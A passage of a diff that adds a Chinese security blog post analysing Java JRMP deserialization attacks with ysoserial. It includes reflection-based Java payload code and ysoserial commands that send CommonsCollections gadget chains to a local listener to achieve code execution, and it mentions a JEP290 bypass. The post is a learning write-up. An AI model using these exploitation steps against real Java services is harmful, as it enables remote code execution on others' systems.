class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">uni</span> <span class="operator">=</span> (UnicastRemoteObject) constructor2.newInstance(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上代码就可以得到一个UnicastRemoteObject类型的ActivationGroupImpl对象，向上转型就能获取到UnicastRemoteObject。这样可以避免直接实例化UnicastRemoteObject对象直接触发监听（可以参考RMI远程对象创建那里的代码分析）。</p>
+<p>但是当正常对UnicastRemoteObject反序列化，会发现端口并不是指定的，而是一个随机端口，但是我们可以通过反射修改端口为指定的值，ysoserial项目中的源代码：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925193427586.png" alt="image-20240925193427586"></p>
+<p>跟进一下这里的getField()方法：<br><img src="/2024/10/07/JRMP/image-20240925193519219.png" alt="image-20240925193519219"></p>
+<p>就是获取UnicastRemoteObject类的port变量，然后返回这个值。</p>
+<p>继续往后看，就是对这个获取到的字段调用set()方法修改值，uro就是对应的前面的ActivationGroupImpl类，这里你也就是那个实例的变量port改为了123：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925193915244.png" alt="image-20240925193915244"></p>
+<p>本地代码实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JRMP.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.ActivationGroupImpl;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastServerRef;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> RemoteObject.class.getDeclaredConstructor();</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory().newConstructorForSerialization(ActivationGroupImpl.class, constructor1);</span><br><span class="line">        constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">uni</span> <span class="operator">=</span> (UnicastRemoteObject) constructor2.newInstance(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field0.set(uni, port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>虽然实例的对象看似是ActivationGroupImpl，但是这个实例记录了了和父类的属性，所以其实可以当做是我们想要利用的UnicastRemoteObject类实例。</p>
+<p>这样做的原因是为了避免直接实例化UnicastRemoteObject对象直接触发监听。</p>
+<h3 id="payload-JRMPClient"><a href="#payload-JRMPClient" class="headerlink" title="payload&#x2F;JRMPClient"></a>payload&#x2F;JRMPClient</h3><p>反序列化UnicastRef类。</p>
+<p>UnicastRef类实现了RemoteRef接口，RemoteRef接口又实现了Externalizable接口，Externalizable接口又实现了Serializable接口。</p>
+<p>Externalizable接口定义了writeExternal和readExternal方法，用于实现序列化和反序列化。</p>
+<p>UnicastRef.readExternal方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925195637853.png" alt="image-20240925195637853"></p>
+<p>这里的UnicastRef也是老朋友了，这里会调用LiveRef类的read()方法（传入了序列化数据和false）：<br><img src="/2024/10/07/JRMP/image-20240925195839152.png" alt="image-20240925195839152"></p>
+<p>传入的var1是false，所以这里会调用TCPEndpoint类的readHostPortFormat()方法（传入了序列化数据流）：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925200251084.png" alt="image-20240925200251084"></p>
+<p>这里就是从数据流中读取host和port，实例化TCPEndpoint类并返回了它。</p>
+<p>回到LiveRef类的read()方法：<br><img src="/2024/10/07/JRMP/image-20240925201946802.png" alt="image-20240925201946802"></p>
+<p>同样是在数据流中读取数据，随后实例化一个LiveRef对象作为返回值，这个封装了TCPEndpoint类（里面包含了host、port等信息）、ObjID类实例等信息。</p>
+<p>还需要注意的一部分代码（if语句），只要这个输入流的类型不是ConnectionInpotStream（我们是可以控制这个输出流的），就会进入else语句调用DGCClient类的registerRefs()方法，跟进这个方法（传入了前面返回的TCPEndpoint类和含有LiveRef类的一个列表）：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925203438998.png" alt="image-20240925203438998"></p>
+<p>先会执行一次EndpointEntry.lookup方法，跟进一下：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925203740413.png" alt="image-20240925203740413"></p>
+<p>这里的endpointTable就是一个HashMap类实例。代码逻辑不难，所以这里就是会返回一个EndpointEntry类实例。</p>
+<p>然后会调用EndpointEntry.registerRefs()方法，这个方法末尾处调用了makeDirtyCall()方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925204103272.png" alt="image-20240925204103272"></p>
+<p>跟进makeDirtyCall方法，其中会调用DGC.dirty方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925204423753.png" alt="image-20240925204423753"></p>
+<p>实际会调用DGCImpl_Stub.dirty方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925204635729.png" alt="image-20240925204635729"></p>
+<p>这个方法调用了newCall()方法建立一次连接，还会对remoteCall进行一次反序列化。</p>
+<p>在注册远程对象时，利用RemoteObjectInvocationHandler来为UnicastRef创建了动态代理，这里同样需要实现它。</p>
+<p>所以我们需要先创建了一个<code>UnicastRef</code>对象（直接借鉴ysoserial项目的代码）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line"><span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line"><span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后直接创建动态代理即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Registry.class&#125;, obj);</span><br></pre></td></tr></table></figure>
+
+<h3 id="exploit-JRMPListener"><a href="#exploit-JRMPListener" class="headerlink" title="exploit&#x2F;JRMPListener"></a>exploit&#x2F;JRMPListener</h3><p>通用JRMP 侦听器，打开一个JRMP 侦听器，该侦听器会将指定的有效负载传递给连接到它并进行调用的任何客户端。</p>
+<p>ysoserial中，获取一个用于反序列化对象：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925215655280.png" alt="image-20240925215655280"></p>
+<p>即exploit&#x2F;JRMPListener开启监听，客户端向exploit&#x2F;JRMPListener进行连接时，会返回给客户端一个序列化对象，服务器接受一个对象后会进行反序列化操作。</p>
+<p>这个恶意对象就是这里payloadObject</p>
+<p>那么如何让客户端主动向exploit&#x2F;JRMPListener进行连接？这里就需要用到payload&#x2F;JRMPClient，UnicastRef对象封装了host、port等信息，反序列化UnicastRef对象后，会触发DGC通信，与指定的host和port进行连接。</p>
+<h3 id="exploit-JRMPClient"><a href="#exploit-JRMPClient" class="headerlink" title="exploit&#x2F;JRMPClient"></a>exploit&#x2F;JRMPClient</h3><p>通用JRMP客户端，这是一个针对远程DGC的。</p>
+<p>在前面RMI的分析汇总，可以知道RMI注册端口时，TableObject就存在DGC了。</p>
+<p>可以结合payload&#x2F;JRMPListener来监听某个端口，来攻击DGC</p>
+<p>而在ysoserial中，exploit&#x2F;JRMPClient调用了makeDGCCall</p>
+<p><img src="/2024/10/07/JRMP/image-20240925220541032.png" alt="image-20240925220541032"></p>
+<p>主要为了调用dirty方法触发反序列化，传递一个用于反序列化的对象</p>
+<p><img src="/2024/10/07/JRMP/image-20240925215655280.png" alt="image-20240925215655280"></p>
+<p>最后在远程DGC层触发反序列化，以达到攻击远程DGC层的目的。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>实战情况中：</p>
+<ul>
+<li>exploit&#x2F;JRMPListener通常跟payload&#x2F;JRMPClient搭配使用来触发反序列化攻击</li>
+<li>exploit&#x2F;JRMPClient通常跟payload&#x2F;JRMPListener搭配使用来触发反序列化攻击</li>
+</ul>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>结合前面程序分析，可以简单理出如下两种攻击方式</p>
+<h2 id="第一种攻击方式（客户端打服务端）"><a href="#第一种攻击方式（客户端打服务端）" class="headerlink" title="第一种攻击方式（客户端打服务端）"></a>第一种攻击方式（客户端打服务端）</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在前面payload&#x2F;JRMPListener的分析中，我们可以返回一个“UnicastRemoteObject类实例”，并且在yso的运行下这个对象将会被序列化传输。</p>
+<p>当某个受攻击机反序列化这个类时，会调用到listen()方法开启我们指定的端口。然后我们就可以通过exploit&#x2F;JRMPClient去发送攻击载荷，最终在存在漏洞的服务器上进行反序列化操作。</p>
+<h3 id="主要攻击点"><a href="#主要攻击点" class="headerlink" title="主要攻击点"></a>主要攻击点</h3><p>DGCImpl_Skel#dispatch()   。  也是很好理解的，前面分析过会反序列化UnicastRemoteObject类，会开启监听，并且自然会调用到ObjectTable类的putTarget()方法，就会有DGCImpl_Stub和DGCImpl_Skel的生成。</p>
+<p>可以使用下命令来生成一个序列化对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPListener 1099 &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>然后反序列化这个文件开启监听：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\java工具\\ysoserial\\payload&quot;</span>));</span><br><span class="line">        out.readObject();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用netstat命令查看端口使用情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -aon|findstr 1099</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/10/07/JRMP/image-20240927185604839.png" alt="image-20240927185604839"></p>
+<p>可以看到开启了监听。</p>
+<p>然后我们就可以利用exploit&#x2F;JRMPClient来发送 gadgets 来进行利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 calc</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算机：</p>
+<p><img src="/2024/10/07/JRMP/image-20240927185913450.png" alt="image-20240927185913450"></p>
+<p>调用栈如下：</p>
+<p><img src="/2024/10/07/JRMP/image-20240927190529663.png" alt="image-20240927190529663"></p>
+<h3 id="小局限"><a href="#小局限" class="headerlink" title="小局限"></a>小局限</h3><p>算二次反序列化了，本来其实在payload&#x2F;JRMPListener那里会返回一个对象，直接将这个对象设置为gadgets即可，这里是先反序列化开启端口然后再发送数据造成反序列化。</p>
+<p>（也许刚好可以用来绕过黑名单呢）</p>
+<h2 id="第二种攻击方式（服务端打客户端）"><a href="#第二种攻击方式（服务端打客户端）" class="headerlink" title="第二种攻击方式（服务端打客户端）"></a>第二种攻击方式（服务端打客户端）</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>都是打组合拳，挺有意思的。这里的payload&#x2F;JMPClient会返回一个代理对象，代理的就是UnicastRef类对象，所以当反序列化这个代理对象的时候同样会反序列化UnicastRef类对象，这个反序列化过程也是分析过的，会调用到DGCImpl_Stub类的dity()方法，发送一个请求。</p>
+<p>然后就可以使用exploit&#x2F;JRMPListener来进行监听，当被攻击方反序列化前面paylaod&#x2F;JRMPClient返返回给它的对象，就会发送请求使得我们的exploit&#x2F;JRMPListener接受到请求并返回给被攻击方恶意序列化数据，从而达到命令执行。</p>
+<h3 id="主要攻击点-1"><a href="#主要攻击点-1" class="headerlink" title="主要攻击点"></a>主要攻击点</h3><p><code>DGCImpl_Stub#dirt()</code> ，粘过来一下图片：</p>
+<p><img src="/2024/10/07/JRMP/image-20240927172524021.png" alt="image-20240927172524021"></p>
+<p>很好理解，就是这里invoke()传输数据后，后面的readObject()触发反序列化。</p>
+<p>这个服务端打客户端的类型比起客户端打服务端的类型会更加的常用，一方面是外连，另一方面更多的因为是该 <code>exploit/JRMPListener+payloads/JRMPClient</code> 还存在绕过 <code>jep290</code> 的限制，所以往往会更加的通用。</p>
+<p>简单给个ysoserial项目使用方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1299 CommonsCollections7 &quot;calc&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -cp ysoserial-all.jar ysoserial.payloads.JRMPClient &quot;127.0.0.1:1299&quot;</span><br></pre></td></tr></table></figure>
+
+<p>大概就是找到一个反序列化点，然后将其payloads&#x2F;JRMPClient发送，自己本地开启一个exploit&#x2F;JRMPListener监听。后面找到题再实践一下，本地没打出来，感觉会不会是受害机没搞好？应该不是jdk版本限制。</p>
+<p>也可以算作是一个二次反序列化的点。</p>
+<p>（说是可以绕过jdk231下的JEP290策略限制）</p>
+<p>参考文章：</p>
+<p><code>https://nivi4.notion.site/Java-JRMP-c56237c2fba34351b785628792157423</code></p>
+<p><code>https://www.cnblogs.com/zpchcbd/p/14934168.html</code></p>
+<p><code>https://www.cnblogs.com/gaorenyusi/p/18396965</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/10/07/JRMP/" title="JRMP">https://fupanc.github.io/2024/10/07/JRMP/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/07/RMI/" rel="prev" title="Java RMI">
+                  <i class="fa fa-angle-left"></i> Java RMI
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
